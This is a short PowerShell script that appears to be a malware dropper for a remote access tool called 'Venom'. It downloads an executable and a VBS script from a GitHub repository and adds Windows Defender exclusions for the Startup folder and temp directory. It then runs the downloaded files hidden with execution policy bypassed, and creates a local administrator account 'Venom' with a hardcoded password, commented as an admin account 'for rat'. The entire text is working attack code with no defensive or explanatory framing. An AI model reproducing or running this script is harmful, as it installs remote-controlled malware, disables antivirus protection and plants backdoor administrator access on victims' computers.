

powershell powershell.exe "Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/exe/attempt1.exe -OutFile "attempt1.exe"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"

Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/calty2.vbs -OutFile "calty2.vbs"

powershell powershell.exe -windowstyle hidden -ep bypass "./attempt1.exe; calty2"


#create admin for rat
function Create-NewLocalAdmin {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )
    begin {
    }
    process {
        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
        Write-Verbose "$NewLocalAdmin local user created"
        Add-LocalGroupmember -Group "Administrators" -Member "$NewLocalAdmin"
        Write-Verbose "$NewLocalAdmin added to the local administrator group"
    }
    end {
    }
}
$NewLocalAdmin = "Venom"
$Password = (ConvertTo-SecureString "V3n0m" -AsPlainText -Force)
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
